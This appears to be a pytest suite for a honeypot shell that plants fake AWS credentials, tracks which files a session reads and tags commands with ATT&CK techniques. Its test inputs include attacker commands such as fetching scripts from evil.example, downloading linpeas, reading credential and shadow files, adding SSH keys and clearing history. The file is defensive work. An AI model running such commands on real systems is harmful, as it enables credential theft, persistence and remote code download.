import pytest

from app.classify import classify
from app.fs import AWS_CREDENTIALS, HOME, FileSystem
from app.shell import Shell

AWS_KEY = {"access_key_id": "AKIATESTTESTTESTTEST", "secret_access_key": "s" * 40}


@pytest.fixture
def base_fs():
    return FileSystem.build(AWS_KEY)


@pytest.fixture
def sh(base_fs):
    return Shell(base_fs.copy())


# --- filesystem

def test_bait_is_planted(base_fs):
    creds = base_fs.read(AWS_CREDENTIALS)
    assert "AKIATESTTESTTESTTEST" in creds
    assert "s3://corp-backups" in base_fs.read(f"{HOME}/.bash_history")
    assert base_fs.is_dir(f"{HOME}/.aws")


def test_sessions_do_not_share_changes(base_fs):
    a, b = Shell(base_fs.copy()), Shell(base_fs.copy())
    a.run("touch /tmp/evil && rm -rf ~/.aws")
    assert a.run("ls /tmp") == "evil\n"
    assert b.run("ls /tmp") == ""
    assert base_fs.is_file(AWS_CREDENTIALS)
    assert "No such file" in a.run("cat ~/.aws/credentials")


# --- shell basics

def test_prompt_and_navigation(sh):
    assert sh.prompt() == "deploy@ops-deploy-01:~$ "
    sh.run("cd releases")
    assert sh.run("pwd") == f"{HOME}/releases\n"
    assert sh.prompt() == "deploy@ops-deploy-01:~/releases$ "
    sh.run("cd /etc")
    assert sh.prompt().endswith(":/etc$ ")
    assert "No such file or directory" in sh.run("cd /nope")
    sh.run("cd")
    assert sh.cwd == HOME


def test_ls_hides_dotfiles_unless_asked(sh):
    assert sh.run("ls") == "notes.txt  releases\n"
    listing = sh.run("ls -la")
    assert ".aws" in listing and ".bash_history" in listing
    assert "-rw------- 1 deploy" in sh.run("ls -l .aws/credentials")


def test_reading_credentials_is_tracked(sh):
    out = sh.run("cat ~/.aws/credentials")
    assert "aws_access_key_id = AKIATESTTESTTESTTEST" in out
    assert sh.files_read == [AWS_CREDENTIALS]
    sh.run("whoami")
    assert sh.files_read == []


def test_grep_through_a_pipe_also_counts_as_a_read(sh):
    assert sh.run("cat .aws/credentials | grep -i secret").startswith("aws_secret_access_key")
    assert sh.run("grep key ~/.aws/credentials").count("\n") == 2
    assert AWS_CREDENTIALS in sh.files_read


def test_operators(sh):
    assert sh.run("echo a; echo b") == "a\nb\n"
    assert sh.run("false_cmd && echo no") == "-bash: false_cmd: command not found\n"
    assert sh.run("false_cmd || echo yes").endswith("yes\n")
    assert sh.run("cat /etc/passwd | grep deploy | wc -l") == "1\n"
    assert sh.run("history | tail -1").strip().endswith("history | tail -1")


def test_redirection_and_session_state(sh):
    sh.run("echo hello > /tmp/x.txt")
    sh.run("echo world >> /tmp/x.txt")
    assert sh.run("cat /tmp/x.txt") == "hello\nworld\n"
    sh.run("mkdir -p /tmp/tools/bin && cd /tmp/tools")
    assert sh.run("ls") == "bin\n"


def test_variables(sh):
    assert sh.run("echo $HOME $USER") == f"{HOME} deploy\n"
    sh.run("export FOO=bar")
    assert sh.run("echo ${FOO}") == "bar\n"


def test_unknown_command_without_fallback(sh):
    assert sh.run("nmap 10.66.0.0/24") == "-bash: nmap: command not found\n"
    assert sh.status == 127
    assert not sh.used_fallback


def test_fallback_is_used_only_for_unknown_commands(base_fs):
    seen = []
    sh = Shell(base_fs.copy(), fallback=lambda line, shell: seen.append(line) or "fake output")
    assert sh.run("lsof -i") == "fake output\n"
    assert sh.used_fallback and seen == ["lsof -i"]
    sh.run("cat ~/.aws/credentials")
    assert seen == ["lsof -i"]          # bait always comes from the scripted layer


def test_fallback_returning_none_degrades_gracefully(base_fs):
    sh = Shell(base_fs.copy(), fallback=lambda line, shell: None)
    assert sh.run("lsof -i") == "-bash: lsof: command not found\n"


def test_network_and_privilege_commands_fail_realistically(sh):
    assert "Could not resolve host: evil.example" in sh.run("curl http://evil.example/x.sh")
    assert "unable to resolve host address" in sh.run("wget http://evil.example/x.sh")
    assert "incorrect password" in sh.run("sudo -l")
    assert "10.66.0.22:9000" in sh.run("aws s3 ls")
    assert "Permission denied" in sh.run("cat /etc/shadow")


def test_exit(sh):
    assert sh.run("exit") == "logout\n"
    assert sh.exited


def test_bad_quotes(sh):
    assert "unexpected EOF" in sh.run("echo 'oops")


# --- ATT&CK classification

@pytest.mark.parametrize("command,expected", [
    ("whoami", {"T1033"}),
    ("uname -a", {"T1082"}),
    ("ps aux", {"T1057"}),
    ("cat ~/.aws/credentials", {"T1552.001"}),
    ("cat .bash_history", {"T1552.003"}),
    ("wget http://x/linpeas.sh && chmod +x linpeas.sh", {"T1105", "T1222.002"}),
    ("echo key >> ~/.ssh/authorized_keys", {"T1098.004"}),
    ("history -c", {"T1552.003", "T1070.003"}),
    ("cd /tmp; id", {"T1033"}),
    ("aws s3 ls", {"T1580"}),
])
def test_classify(command, expected):
    assert expected <= set(classify(command))


def test_classify_benign_is_empty():
    assert classify("echo hello") == []
